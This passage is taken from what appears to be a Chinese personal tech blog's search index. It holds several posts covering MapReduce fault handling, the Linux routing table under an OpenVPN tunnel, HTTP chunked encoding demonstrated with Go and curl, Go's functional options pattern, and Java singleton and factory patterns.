A 上有文件块 B，而节点 A 又是一个 worker，那么 master 就可以把处理 B 的 map 分配到节点 A 上，这样 map 在读取输入块时就不需要通过网络来拉取数据，直接从本地就可以获取到，从而节省了不必要的网络传输。 其次，map 在读取输入时，实际上读取到的是经过拆分的输入块，该输入块的大小由用户来定义。但是，考虑这样一种情况，假设用户将输入块的大小定义为 16MB，但是这个输入块中最后一条记录是不完整的，对于这整条记录而言，它的前半部分在这个输入块中，而后半部分在下一个输入块中。在这样的情况下，如果依然严格按照 16MB 进行拆分，那么这两个输入块对应的 map 任务都会因为这条不完整的记录而出现问题。对于这个问题，论文 4.4 节表示输入是被一种叫做 reader 的组件来拆分的，而 reader 是知道如何将文件拆分成有意义的记录的（原文：Each input type implementation knows how to split itself into meaningful ranges for processing as separate map tasks），所以我猜测在 reader 这一层面会根据具体的需求灵活地分隔文件，也即前文所述的 16～64 MB 的限制并不是一个硬性限制。 然后，用户可以提供 Partition 函数来帮助 map 决定输出的内容需要被存储的位置。除此之外，用户还可以提供 Combiner 函数。关于这个组件的作用，论文 4.3 节有详细的描述，可以简单地将其理解为一种预处理。论文提供的代码中，被用作 reduce 任务的内容同样被作为了 combiner，这意味着 combiner 函数在执行前，map 产生的内容应该是被排好序的。如论文 4.2 节所言，给定一个分区，内部的 key 是有序的。那么结合 combiner 来看，这个有序就不仅指 reduce 收到的完整的 partition 内容是有序的，对于 map 产生的部分 partition，内部的内容也同样是有序的才对。 接着，MapReduce 提供一种备份任务机制。具体而言，当 MapReduce 过程近乎完成时，框架会把那些尚未完成的任务分配给空闲的 worker，这样同样的任务就有可能被多个 worker 执行，而任意一个 worker 执行成功，master 都会认为这个任务执行成功，从而避免某个 worker 因为各种外部原因（比如硬盘老化导致写入时要不停地进行纠错从而降低写入速度）拖慢整个 MapReduce 的执行速度。 最后，一些特殊的输入可能导致 map/reduce 任务异常退出，这可能是因为用户的代码有 bug，也可能是因为记录本身有问题。要避免因为这种问题导致 MapReduce 无法正常完成，最好的解决办法当然是找出 bug 或记录的问题，但除此之外，框架也允许用户跳过这个会导致问题的记录。具体而言，框架提供了一种特殊的运行模式，在这种模式下，如果 map/reduce 任务异常退出，那么 master 可以感知到是因为哪条记录，然后重新把任务分配给 worker 让其重新执行，如果这次执行同样发生了异常退出，那么 master 在下一次分配这个任务时会告知 worker 跳过这条有问题的记录，从而避免流程进入 执行-异常退出-执行 的死循环中。 错误处理尽管在使用上基本类似于单机框架，但 MapReduce 本质上是作用在分布式环境下的，对于一个分布式系统而言，错误处理永远是一个特别重要的话题。下面来探讨下 MapReduce 框架是如何进行错误处理的。 在深入机制之前，我们首先要明确 MapReduce 是一个批处理框架，这意味着实时性并不是特别重要，如果用户提交了一个任务，需要几分钟乃至几个小时才能执行完成，这都是一个非常正常的情况。也正因为如此，MapReduce 的错误处理非常简单，最核心的就是重试。 因为需要重试，所以 map/reduce 任务的类型是有限的，根据论文的描述，它应该是确定性（deterministic）的，也就是说，同一个任务不论执行多少次，产生的输出都应该是一样的。除此之外，我认为任务本身还应该是幂等的，这意味着类似“每处理一条记录就写一条日志来标识”的操作是有问题的，因为重试很可能导致某条记录对应的日志不唯一。 在机制上，master 节点会定期地 ping 一下所有的 worker 节点，如果某个节点没有回复响应，那么 master 就将这个 worker 标记为异常，然后将它上面运行的所有任务在正常的 worker 上重新执行。那么，重试对整个执行流程有什么影响吗？答案是没什么影响，我们分别针对 map 和 reduce 来讨论。 首先对于 map 而言，master 有这样一条限制：如果已经从一个 map 获取到了其上报的中间文件信息，且这个 map 所在的 worker 是正常的，那么会忽略不同 worker 上的同一个 map 上报的信息。这条限制也是前文所述的备份任务得以正常执行的前提。因此，如果一个 map 所在的 worker 异常了，那么 master 会将同样的 map 分配给其他的 worker，即便后面这个 worker 恢复了，master 也会从这两份 map 上报的信息中选择更早的那一份作为最终的文件路径。如前所述，这些输出文件是被保存在 map 所在 worker 自己的本地磁盘上的，所以只要两个 map 所在的 worker 不同，产生的文件就互不影响。而确定了最终的文件路径后，master 会将其通知给所有的 reduce，这时如果哪个 reduce 没有获取或尚未获取完这个 map 对应的输出文件，那么将继续从这个新的 worker 上拉取对应的输出文件。 然后是 reduce，为了避免因为重试导致的多个 reduce 实例一起写入同一个最终输出文件（例如 /gfs/test/freq-00001-of-00100），每个 reduce 实际上是先写一个相互隔离的临时文件的。也就是说，即便是同一个 reduce 任务的不同实例，写入的临时文件也是不同的。在整个 reduce 任务完成后，框架将这个临时文件更名为最终输出文件的名字，而对于 GFS 而言，更名操作是原子性的，这就保证了最终输出文件的完整性。 但是仔细考虑 reduce，会发现很可能最终 MapReduce 执行完成后，GFS 上因为重试而保存了多份同样的内容，其中之一作为最终的输出文件，剩下的都是临时文件，这显得有些冗余。但是，其实 GFS 本身保证写入操作的一致性就是“至少一次”，也就是说，使用 GFS 写入文件时（实际上是追加写），本身就可能产生多份重复的内容，只不过在读取时不会感知到。因此，MapReduce 导致的这份“冗余”，在这样的环境下就显得合情合理了。","categories":[{"name":"分布式","slug":"分布式","permalink":"/categories/分布式/"},{"name":"论文","slug":"论文","permalink":"/categories/论文/"}],"tags":[]},{"title":"【好文翻译】如何解读路由表中的信息","slug":"Interpreting-Routing-Table","date":"2022-06-11T14:48:08.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2022/06/11/Interpreting-Routing-Table/","link":"","permalink":"/2022/06/11/Interpreting-Routing-Table/","excerpt":"","text":"前言为了了解 ip route 命令显示的信息有什么含义，以及它对 Linux 收发网络包的影响，我在网络上搜索了很多文章，但是这些文章多数都仅仅是按序描述每个字段的作用，没有通过具体的例子来加深印象。偶然间，在 Diego Assencio 大大的个人网站里发现了这篇文章，拜读之后感觉收获颇丰。 这篇文章给出了两个例子，第一个例子是常见的网络访问，第二个则是在 VPN 环境下的网络访问，通过阅读这篇文章，至少对于我而言有种茅塞顿开的感觉，尤其是后面 VPN 的例子，读完后就能更好地了解容器网络或虚拟机网络的实现方式。 所以本文尝试翻译 Diego Assencio 的文章，一方面做一个初次翻译的尝试，一方面备份在这里方便未来自己的阅读，侵删。 正文这篇文章将会描述如何解读 Linux 系统中路由表的信息。所谓路由表其实就是一个包含了许多路由规则的表单，网络包会根据它的目的地址来选择使用其中的哪条规则。 为了更好地理解这篇文章描述的内容，读者必须先理解两件事情：CIDR 表示法（这东西以 &lt;network-prefix&gt;/&lt;netmask-length&gt; 的格式来声明一个 IP 地址的子网）以及最长前缀匹配算法（译者注：事实上，对 tun/tap 设备的了解也是必须的，这对于理解下文 VPN 的例子尤其重要）。如果读者目前还不了解它们，请先花一些时间来学习，然后再继续阅读本文。此外，我们接下来要描述的例子都基于 IPv4 网络，但是相关的概念对 IPv6 网络也同样适用。 在 Linux 系统上，主要有两个命令用于获取路由表信息：route 和 ip。本文将使用 ip 命令，因为它输出的内容比 route 命令更加易于解读。为了使用 ip 命令来显示操作系统中路由表的内容，请打开一个终端模拟器（terminal），然后运行下面的命令： 1ip route show 这个命令的输出取决于机器的网络配置以及实际的网络拓扑。比如让我们来考虑一个通过无线网络连接到路由器以访问外部网络的机器，机器的 IP 地址为 192.168.1.100，而路由器的地址为 192.168.1.1，那么 ip 命令的输出就有可能如下： 12default via 192.168.1.1 dev wlan0192.168.1.0/24 dev wlan0 proto kernel scope link src 192.168.1.100 让我们从第二行开始解读这个输出。这一行表示“任何被发往 192.168.1.0/24 这个网络的包都会以 192.168.1.100 作为源地址，然后被 wlan0 这个设备发送出去”，192.168.1.100 这个地址是 DHCP 服务端为 wlan0 设备分配的地址。而剩下的部分则可能不那么有趣：proto kernel 表示这条路由是被操作系统内核在自动配置期间创建的；而 scope link 则表示在 192.168.1.0/24 这个网络中的目标地址都仅对 wlan0 这个设备有效。 而这个输出中的第一行则表示所有网络包的默认路由（即，当没有其他路由可以被使用时，网络包将使用这一条路由）。具体含义指网络包将被 wlan0 设备发送到默认网关（译者注：通常就是指家用路由器），而这个网关的地址是 192.168.1.1。 ip 这个命令的输入非常灵活，例如可以只输入命令的一部分，然后这个输入就会被 ip 命令自动在内部进行补全。举例来说，下面所有的命令实际上都是等价的： 1234ip r sip r showip ro ship route show 接下来让我们来考虑一个更复杂的例子，当设备连接到一个虚拟专用网络（VPN）时，所有网络流量都会经过一个加密隧道（tunnel）被发送到 VPN 服务端。我们以一个 OpenVPN 的网络作为例子，在这个例子中，我们有如下设备及其 IP 地址： tun0：192.168.254.10 wlan0：192.168.1.100 路由器：192.168.1.1 OpenVPN 服务端：95.91.22.94 一个网络包在被发往目的地的途中会经历如下的流程： 1原始网络包 --&gt; tun0 -加密后的网络包-&gt; wlan0 --&gt; 路由器 --&gt; OpenVPN 服务端 -解密后的网络包-&gt; 目的地 首先，一个虚拟网络设备（通常叫做 tun0）会被创建，然后一些路由信息会被加入到路由表中，这些信息引导几乎所有的流量经过 tun0 这个设备，在这里网络包会被加密，然后最终通过 wlan0 这个网络设备被发送到 OpenVPN 的服务端。 下面是一种可能的路由表输出，这个输出来源于一个已经连接到 OpenVPN 服务端的设备（也就是 OpenVPN 的客户端）： 12345670.0.0.0/1 via 192.168.254.9 dev tun0default via 192.168.1.1 dev wlan095.91.22.94 via 192.168.1.1 dev wlan0128.0.0.0/1 via 192.168.254.9 dev tun0192.168.1.0/24 dev wlan0 proto kernel scope link src 192.168.1.100192.168.254.0/24 via 192.168.254.9 dev tun0192.168.254.9 dev tun0 proto kernel scope link src 192.168.254.10 直接解释这个路由表中的所有细节显得有些单调乏味，所以我们将关注这些输出中的重点部分。请注意第二行：这个设备上的默认路由并没有发生变化。然而，第一行和第四行引入了两条新的路由规则，这将完全改变游戏的规则：被发送到 0.0.0.0/1 和 128.0.0.0/1 两个网络的所有网络包都会经过 tun0 设备，并且以 192.168.254.9 作为网关的地址。 这里需要注意的是，0.0.0.0/1 和 128.0.0.0/1 分别匹配目标地址的第一个比特位为 0 和 1 的网络包。当它们一起工作时，就可以代替第二行的规则成为新的默认路由规则。因为对于任何一个网络包而言，它的目标地址的第一个比特位不是 0 就是 1，而根据最长前缀匹配算法，网络包将优先选择这两条规则（译者注：可以认为 default 路由中目标地址子网掩码的长度为 0）。因此，当 OpenVPN 进程为主机创建了这两条路由后，所有的网络包都会默认被发往 tun0 设备，而从这里开始，网络包就会被加密发送到 95.91.22.94（OpenVPN 服务端的地址）。显而易见，上面输出中的第三行描述了这部分内容：被发往 95.91.22.94 的网络包都由 wlan0 设备以 192.168.1.1 作为网关发出。 一些读者可能会好奇上面的输出中 192.168.254.9 这个地址，那么它是怎么来的呢？事实上，OpenVPN 在创建 tun0 设备时是以 point-to-point 模式创建的，这意味着这个设备在工作时就好像直接连接在另一端上（译者注：也就是不需要通过中间路由器进行转发），而这个 192.168.254.9 就是另一端的设备，它实际上就是 OpenVPN 的服务端。服务端负责创建 192.168.254.0/24 这个虚拟网络，然后从地址池中选出空闲的 IP 地址分配给那些连接到自己的主机。如上面输出的最后一行所示，192.168.254.10 就是这个路由表所在的主机被分配到的地址，而 192.168.254.9 则是服务端在这个虚拟网络中的地址。 读者可以通过运行下面的例子来更清晰地证明上面的描述： 1ip addr show dev tun0 对于我们的例子而言，这条命令的输出可以非常清晰地展示前文所述的 point-to-point 连接（注意倒数第二行）： 123421: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100 link/none inet 192.168.254.10 peer 192.168.254.9/32 scope global tun0 valid_lft forever preferred_lft forever 说明这篇文章描述了两个路由表影响网络包收发的例子，如果读者不了解 tun/tap 设备，在阅读 VPN 部分时可能会比较吃力。 简单来说，这种设备可以由系统中的某一个进程打开，然后进程可以选择读取或写入这个设备，如果有网络包被发送到这个设备，那么进程就可以从中读取到数据，和常规的 socket 不同的是，tun 设备可以读取到 IP 层的内容，tap 设备则可以读取到链路层的内容。所以如果进程在收到网络包后将它包装在一个常规的 tcp 或 udp 包中，再经过物理网卡发送到外部网络的某台主机上，那么这台目标主机在解包后就可以看到原始的 IP 包或链路层的内容，从而好像内部的这个网络包直接到达了主机上，以此营造出源主机和目标主机在这个内部网络包层面是相互可达的假象，这种虚拟化技术被叫做 Overlay 网络，如今被广泛运用于容器或虚拟机技术中。 于是在上面 VPN 的例子中，192.168.254.0/24 实际上就是内部网络包的源地址与目的地址所属的网络，而 OpenVPN 的实际网络地址其实是 95.91.22.94，也就是说，如果没有 OpenVPN 创建的 tun 设备，主机通过正常的网络只能访问 95.91.22.94 这个地址。 其他我的大学老师曾对我说，计算机领域要研究的内容总是离不开计算、存储和网络，这句话在近期深入学习容器技术的过程中不断出现在我的脑海里。 Diego Assencio 大大的原文中让我眼前一亮的其实就是 VPN 这个例子，它也是 flannel 项目最初实现的 udp 后端的核心原理，帮助我理解了更多网络方面的有趣知识。笔者对这篇文章的出现表示衷心的感谢。","categories":[{"name":"网络","slug":"网络","permalink":"/categories/网络/"}],"tags":[]},{"title":"浅谈 Http Chunked Encoding","slug":"HTTP-Chunked-Encoding","date":"2022-05-04T11:55:52.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2022/05/04/HTTP-Chunked-Encoding/","link":"","permalink":"/2022/05/04/HTTP-Chunked-Encoding/","excerpt":"","text":"前言在 HTTP 的消息头（即请求头和响应头）中，有一个叫 Content-Length 的字段，用于表示消息体的大小。早期版本的 HTTP 通过服务端发起的断开连接来表示一个消息的结束，这种方式在多数情况下都工作的很好，但是它存在两个比较严重的问题。第一是，在没有一个表示完整消息大小的字段来帮助检查的情况下，客户端无法得知连接的断开是正常情况还是由于消息的传输发生了异常；第二是，在多个 HTTP 消息共用同一个 TCP 连接的场景下，客户端无法找到不同消息间的边界。 所以，HTTP 的规范要求 Content-Length 字段是必须被提供的（虽然实际测试时发现如果服务端没有提供，很多工具依然会将关闭连接作为默认的消息边界）。 但是，有种消息，它是没有这个字段的，取而代之地使用另一种方式来确保消息的完整性，它就是这篇文章的主角，Chunked Encoding，一种消息的传输编码（Transfer Encoding）。 Chunked Encoding 与 curl我最早了解到 Chunked Encoding 恰恰是在用 curl 来测试服务端不提供 Content-Length 会发生什么时。一般来讲，如果你使用 HTTP 的框架提供服务，那么这个消息头是会被框架来处理的。所以最简单的一种绕过框架、发送一个没有这个字段的响应的方式，就是直接使用 TCP，比如在 golang 中你可以编写这样的代码： 123456789101112131415161718192021func TCPServer() &#123; listener, err := net.Listen(\"tcp\", \"localhost:8080\") if err != nil &#123; panic(err) &#125; for &#123; conn, err := listener.Accept() if err != nil &#123; panic(err) &#125; go func() &#123; defer conn.Close() conn.Write([]byte(\"HTTP/1.1 200 OK\\r\\n\" + \"Date: Wed, 04 May 2022 12:38:41 GMT\\r\\n\" + \"Content-Type: text/plain; charset=utf-8\\r\\n\" + \"\\r\\n1234567890\")) &#125;() &#125;&#125; 代码不是很标准，因为这个程序没有读取请求而直接发送响应，不过这无伤大雅。代码主要做的事情就是发送一个没有 Content-Length 请求头字段的响应，但是在请求体里有 1234567890 这样的内容。这时如果执行它，并且使用 curl -v localhost:8080，那么在 curl 的输出中可以发现 no chunk, no close, no size. Assume close to signal end 这样的输出，这证明了我在前言中的描述。 那么，Chunked Encoding 的响应体是什么样的呢，为什么它会被 curl 区别对待？我们仍然可以用 golang 和 curl 进行测试。 golang 的 http 包本身就支持 Chunked Encoding，它的 http.ResponseWriter 接口可以被显式转换成 Flusher 接口，这个接口提供一个 Flush 方法，如果调用它，那么它会以 Chunked Encoding 方式处理发送的内容，于是我们可以编写这样的代码： 123456789101112131415161718func HTTPServer() &#123; http.HandleFunc(\"/\", func(rw http.ResponseWriter, r *http.Request) &#123; flusher, ok := rw.(http.Flusher) if !ok &#123; panic(\"can not convert rw to flusher\") &#125; for i := 0; i &lt; 5; i++ &#123; rw.Write([]byte(fmt.Sprintf(\"message #%d\\n\", i))) flusher.Flush() time.Sleep(time.Second) &#125; &#125;) if err := http.ListenAndServe(\"localhost:8080\", nil); err != nil &#123; panic(err) &#125;&#125; 这段代码试图分五次发送响应体，每次间隔一秒钟。如果我们使用 curl -v localhost:8080 ，那么会发现响应体确实如预期一般每隔一秒发送一部分，同时响应头中有 Transfer-Encoding: chunked 这样的字段表示这个响应是以 Chunked Encoding 的方式被发送的，而且这个响应也确实没有 Content-Length 这个字段。 更进一步的，如果再为 curl 加上 –raw 参数，也就是使用 curl -v --raw localhost:8080，那么就可以获取原始的响应体内容，这个命令的结果是这样的： 12345678910111213141516bmessage #0bmessage #1bmessage #2bmessage #3bmessage #40 再进一步，如果命令变成了 curl -v --raw localhost:8080 | hexdump -C ，就可以得到这样的响应体内容： 123456700000000 62 0d 0a 6d 65 73 73 61 67 65 20 23 30 0a 0d 0a |b..message #0...|00000010 62 0d 0a 6d 65 73 73 61 67 65 20 23 31 0a 0d 0a |b..message #1...|00000020 62 0d 0a 6d 65 73 73 61 67 65 20 23 32 0a 0d 0a |b..message #2...|00000030 62 0d 0a 6d 65 73 73 61 67 65 20 23 33 0a 0d 0a |b..message #3...|00000040 62 0d 0a 6d 65 73 73 61 67 65 20 23 34 0a 0d 0a |b..message #4...|00000050 30 0d 0a 0d 0a |0....|00000055 这样看来就很明显了：Chunked Encoding 发送的每一部分响应体，都会以一个 16 进制的数字作为开始，这个数字表示这部分响应体的长度，后面接 \\r\\n ，然后是具体的响应体内容，再接 \\r\\n标记这部分响应的结束（上面例子中倒数第三列的 0a 是前面 fmt.Sprintf(&quot;message #%d\\n&quot;, i) 中的 \\n，并不是 Chunked Encoding 的结构）。最终，以 0 表示整个响应的结束，由于长度为 0，那么紧随其后的只有两个 \\r\\n。 Chunked Encoding 与 Golang http 的客户端golang 对 Chunked Encoding 的支持不仅限于服务端，比如我们还是使用上面的代码作为服务端，但是编写这样的代码来作为客户端： 1234567891011121314151617181920func HTTPClient() &#123; rsp, err := http.Get(\"http://localhost:8080\") if err != nil &#123; panic(err) &#125; buf := make([]byte, 512) for &#123; len, err := rsp.Body.Read(buf) if err != nil &#123; if err == io.EOF &#123; fmt.Println(\"Done\") return &#125; panic(err) &#125; fmt.Println(len, string(buf[:len])) &#125;&#125; 那么在运行它后，会得到如下的输出（每部分同样会间隔一秒）： 123456789101111 message #011 message #111 message #211 message #311 message #4Done 通过前面的内容我们可以知道，响应体的内容是包含长度、\\r\\n、部分响应体内容的，但是如果我们直接使用 golang 的 http.Response.Body.Read 方法，就可以直接拿到响应体的有效内容部分，不需要我们自己去做一些额外的操作（比如读取长度，跳过CRLF，验证长度等等）。 Chunked Encoding 与 Golang http 的服务端现在让我们把关注点放回到服务端上，不难想象，这种不需要提前计算 Content-Length、动态持续生成内容的消息类型，在一定程度上是可以实现 Websocket 的功能的，因为常规 HTTP 的痛点就在于它是一问一答的形式，而且回答的内容在被发送前就要确定下来。事实上，如果读者熟悉 Kubernetes 的 watch 机制，就会知道它是同时支持 Chunked Encoding 和 Websocket 两种方式的。 所以我们可以编写下面这样的一个小例子来演示 Chunked Encoding 的这种能力： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package mainimport ( \"fmt\" \"net/http\" \"sync\")// 用来线程安全地对 connections 变量使用 appendvar globalLock = &amp;sync.Mutex&#123;&#125;// 用来保存所有的 Connection 对象var connections []*Connectionfunc main() &#123; // 创建一个 Connection 对象，并将它放入 connections 切片中 http.HandleFunc(\"/watch\", func(rw http.ResponseWriter, r *http.Request) &#123; c := NewConnection(rw) globalLock.Lock() fmt.Println(\"Append one\") connections = append(connections, c) globalLock.Unlock() c.Send(\"Start Watching...\\n\") select &#123;&#125; // 避免函数退出，从而保留住连接，这会有协程泄露的问题，但是这里先不管 &#125;) // 对 connections 中的所有连接发送一条消息 http.HandleFunc(\"/send\", func(rw http.ResponseWriter, r *http.Request) &#123; msg := r.URL.Query().Get(\"msg\") for _, c := range connections &#123; fmt.Println(\"Send one\") c.Send(msg + \"\\n\") // 这里加一个回车方便观察 &#125; rw.Write([]byte(\"Done\")) &#125;) if err := http.ListenAndServe(\"localhost:8080\", nil); err != nil &#123; panic(err) &#125;&#125;// 代表一个 Chunked Encoding 连接，提供 Send 方法用于发送一部分响应体type Connection struct &#123; rw http.ResponseWriter flusher http.Flusher lock *sync.Mutex&#125;func NewConnection(rw http.ResponseWriter) *Connection &#123; flusher, ok := rw.(http.Flusher) if !ok &#123; panic(\"can not convert rw to flusher\") &#125; return &amp;Connection&#123;rw, flusher, &amp;sync.Mutex&#123;&#125;&#125;&#125;// 以 Chunked Encoding 的方式发送响应体的一部分func (c *Connection) Send(msg string) &#123; // 这里的加锁是必须的，因为下面的操作并不是原子的 // 而多协程同时写响应体会导致 Chunked Encoding 的结构乱掉，从而引发客户端异常 c.lock.Lock() defer c.lock.Unlock() c.rw.Write([]byte(msg)) c.flusher.Flush()&#125; 代码有些长，主要的功能是提供了 /watch 和 /send 两个 path，前者用于和服务端保持一个连接，并从这个连接中接受被服务端下发的内容，后者则可以传递一个 msg 的 query 参数，其内容会被广播给所有的 Chunked Encoding 连接。 运行这个程序，然后多准备几个终端窗口，均执行 curl -v localhost:8080/watch，待它们都显示 Start Watching... 消息后，再打开一个终端窗口，执行 curl localhost:8080/send\\?msg=aaaaa，就可以发现前面的所有窗口都收到了 aaaaa 这个消息。而这，其实本质上和 k8s 的 watch 机制是一样的。 上面的代码仅仅起到抛砖引玉的作用，由于 Chunked Encoding 在一定程度上提供了类似全双工通信的能力，我们完全可以基于它实现更多，比如实时消息推送、聊天室等等。 杂谈最近辞掉了公司实习生的身份，距离毕业后回去做正式员工还有大概一个多月的时间，想在这段时间内好好休息一下。由于手头的工作就只有毕业设计和毕业论文，便有了更充足的时间来兴趣驱动地学一些东西。近期在读《HTTP-The-Definitive-Guide》这本书，主要目的是更深入地了解一些 HTTP 的特性，其次也想借此锻炼一下自己的英语阅读能力。 不过我是乱序读的，目前暂定的阅读顺序是 HTTPS -&gt; Entity&amp;Encoding -&gt; Connection Management -&gt; Cookie -&gt; Cache，其他的内容就按需添加。 这篇文章就是我在阅读了 Entity &amp; Encoding 部分后，针对 http chunked encoding 这个特性的一个总结与实践。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"},{"name":"网络","slug":"网络","permalink":"/categories/网络/"}],"tags":[]},{"title":"Functional-Options","slug":"Functional-Options","date":"2021-04-29T16:04:32.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2021/04/30/Functional-Options/","link":"","permalink":"/2021/04/30/Functional-Options/","excerpt":"","text":"0x00 前言到了大三，学校的课设开始不限制实现的语言了，考虑到为未来打基础，于是我大部分的课设都使用 Golang 来完成，以期在实践中逐渐熟练这门简洁却高效的语言。 在使用的过程中，经常会遇见对结构体进行初始化的需求，如果只是简单的字段还好，直接通过字面量来初始化即可，然而对于一些拥有复杂结构及依赖的结构体，其初始化不论是用户友好性还是可读性上都不适合使用字面量来初始化，在 Golang 的标准库中通常采用返回结构体指针的 New 函数来实现（如 list.New，sync.NewCond），这样在函数中屏蔽了相关的实现细节，以让用户能够聚焦在简单的使用上。 然而，Golang 目前并不支持函数的重载，这导致 New 函数的特征标（signature）是写死的，函数需要什么参数，用户就只能传递什么参数来初始化相应的字段。如果想达到前文所述的易用，那么参数就不该设置得太多；但是如果想给用户足够的能力来按需设置结构体，那么参数就不该设置得太少，这使得开发者很难找到一个平衡点，来设计方便高效的参数进行初始化。 有没有什么方法，能使用同一个初始化函数，通过提供不同的参数来完成对结构体不同程度的初始化呢？ 0x01 解决方法及原理最近在逛左耳耗子老师的博客的时候偶然看到了如题所述的 Functional Options 模式，该模式非常优雅地利用闭包和可变参数等性质来解决了前文所述的问题，下面给出一个例子： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport ( \"fmt\")type Person struct &#123; name string age int hobby string&#125;type withFunc func(*Person)func withName(name string) withFunc &#123; return func(p *Person) &#123; p.name = name &#125;&#125;func withAge(age int) withFunc &#123; return func(p *Person) &#123; p.age = age &#125;&#125;func withHobby(hobby string) withFunc &#123; return func(p *Person) &#123; p.hobby = hobby &#125;&#125;func makePerson(funcs ...withFunc) *Person &#123; ret := &amp;Person&#123;&#125; for _, f := range funcs &#123; f(ret) &#125; return ret&#125;func main() &#123; p1 := makePerson(withName(\"Yuren\")) p2 := makePerson(withName(\"Yuren\"), withAge(21)) p3 := makePerson(withName(\"Yuren\"), withAge(21), withHobby(\"Program\")) fmt.Printf(\"%+v\\n%+v\\n%+v\\n\", p1, p2, p3)&#125; 对于所谓的 New 函数，我个人比较习惯于将其命名为 make+结构体名 的形式，这里就请忽略这个非常不 Golang 的函数名，转而聚焦到函数的实现上。 可以看到，makePerson 函数本身接收一个 withFuncs 的可变参数列表，withFuncs 作为一种类型定义，其本质上是一个需要传递 Person 指针的函数。按照这种特征标，代码中的 withName，withAge 和 withHobby 的返回值都是符合 withFuncs 类型的实现，由于这三者原理上相同，这里只用 withName 来举例。 12345func withName(name string) withFunc &#123; return func(p *Person) &#123; p.name = name &#125;&#125; withName 的函数定义如上，可以看到其返回了一个 withFunc 类型的函数。该函数利用闭包将传递给外层 withName 的 name 参数绑定在其作用域内，使得 withFunc 函数返回后依然具备访问 name 变量的能力，而该函数本身做的事情就是将传递进来的 Person 指针指向的实例中的 name 字段设置为 name 变量的值。 具体的 Person 指针的传递发生在 makePerson 函数调用的时候，即 p1~p3 处，在调用时传递了需要的 with* 函数的调用，将其返回的 withFunc 类型的函数放到了 makePerson 的参数列表中。 makePerson 做的事情就是用待返回的 Person 指针来消耗可变参数列表中的 withFunc 函数，以使其内部的字段被函数初始化成闭包内保留的值。 0x2 总结本文试图通过抛出笔者平时遇到的结构体初始化的矛盾，进而通过学习给出相应的解决办法，同时阐述相关的原理。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"设计模式之单例模式","slug":"DesignPattern-Singleton","date":"2020-11-13T11:44:23.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2020/11/13/DesignPattern-Singleton/","link":"","permalink":"/2020/11/13/DesignPattern-Singleton/","excerpt":"","text":"0x0 前言单例模式是一个比较简单的模式，其目的在于确保某一个类只有一个实例，并且自行实例化并向整个系统提供这个实例。一般来说，对于一些创建、销毁比较昂贵的对象实例，也许使用单例模式是一个不错的选择。比如一个始终需要从键盘获取用户输入的系统，我们可以在类似 Utils 的静态类中设置一个全局唯一的Scanner类，始终用于获取用户的输入，从而避免每次创建删除同类对象产生的开销。 0x1 基本代码很多设计模式相关的教程上都将单例模式分为饿汉单例和懒汉单例，它们的基本代码如下： 123456789101112131415161718192021222324// 饿汉单例class Singleton &#123; static private Singleton instance = new Singleton(); private Singleton() &#123;&#125; public static Singleton getInstance() &#123; return instance; &#125;&#125;// 懒汉单例（线程不安全）class Singleton &#123; static private Singleton instance = null; private Singleton() &#123;&#125; public static Singleton getInstance() &#123; if (instance == null) &#123; instance = new Singleton(); &#125; return instance; &#125;&#125; 可以看到，为了限制客户端对该对象的多次实例化，两者的 constructor 均被设置为 private 可见性，并对外暴露静态方法 getInstance 用于返回内部的实例。区别在于，懒汉单例应用了 lazy loading 的思想，使得 instance 的实例化延迟到 getInstance 方法真正被调用时；而饿汉单例借助了 ClassLoader 的能力，让 instance 的实例化在 Singleton 类被加载时便进行了。 0x2 懒汉单例与线程安全就像上面的注释所言，上述形式的懒汉模式并不是线程安全的，原因在于 instance == null 这句判断在并发的场景下是非常靠不住的，比如如下的代码： 123456789101112131415161718192021222324public class App &#123; public static void main(String[] args) &#123; for (int i=0; i&lt;5; i++) &#123; new Thread(() -&gt; &#123; Singleton.getInstance(); &#125;).start(); &#125; &#125;&#125;class Singleton &#123; static private Singleton instance = null; private Singleton() &#123; System.out.println(\"An instance has been created\"); &#125; public static Singleton getInstance() &#123; if (instance == null) &#123; instance = new Singleton(); &#125; return instance; &#125;&#125; 在笔者的设备上共输出了5次 An instance has been created ，也就是产生了5个不同的对象，这并不符合单例模式。 针对上述问题，可以通过 synchronized 关键字对代码进行加锁，从而在保证线程安全的条件下实现懒汉单例。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"/categories/设计模式/"}],"tags":[]},{"title":"设计模式之工厂模式","slug":"DesignPattern-FactoryPattern","date":"2020-11-05T12:41:00.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2020/11/05/DesignPattern-FactoryPattern/","link":"","permalink":"/2020/11/05/DesignPattern-FactoryPattern/","excerpt":"","text":"0x0 简单（静态）工厂模式一般来说，OOP语言中获取对象的实例都是通过 new 关键字来调用对象的 constructor，从而将实例传递给某个引用或是具体的左值。constructor 根据特征标的不同来进行重载，以达到按需构建对象的目的。 但是这里有个问题，对象的初始化工作均交给了 constructor 来完成，这使得其代码往往变得很长，同时，把一些面向某个类而不是某个实例的操作（比如对实例在其类的内部用静态字段进行计数）写在 consturctor 中也不是很优雅。 更进一步的，像 Java 的 IO 操作中采用了 Filter 模式，这使得一个具备缓冲功能的 FileReader 看起来像这样： 1Reader bufferedReader = new BufferedReader(new FileReader(new File(...))) 如果每次产生这类对象时都这样写，虽然在业务上没什么问题，但是并不利于维护。比如假设突然有了把所有的 Reader 都变成 LineNumberReader 的需求的话，就要修改所有实例的 new 部分。 简单工厂模式就可以很好地解决上述这些问题。 要实现简单工厂模式，最基本的是需要一个工厂类，对于上述的 Reader，可以得到如下工厂： 123456789class ReaderFactory &#123; // constructor 设置为 private，因为这个工厂内部只需要静态方法即可 private ReaderFactory() &#123;&#125; public static Reader createReaderForFile(String filename) throws FileNotFoundException &#123; return new BufferedReader(new FileReader(new File(filename))); &#125;&#125; 这样在要获得 Reader 时，可以写类似 Reader bufferedReader = ReaderFactory.createReaderForFile(...) 的代码，而在日后遇到需要修改为 LineNumberReader 